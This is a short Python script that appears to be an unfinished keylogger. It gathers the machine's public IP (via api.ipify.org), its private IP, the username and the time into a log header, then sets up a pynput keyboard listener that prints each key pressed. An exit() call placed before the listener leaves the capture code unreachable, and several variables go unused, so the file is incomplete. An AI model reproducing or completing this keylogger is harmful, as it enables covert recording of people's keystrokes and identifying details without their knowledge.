from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname(socket.gethostname())
user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
datetime = time.ctime(time.time())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'

logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

exit()

def on_press(key):
    print(key)

"""keyboard listener"""
with Listener(on_press=on_press) as listener:
    listener.join()
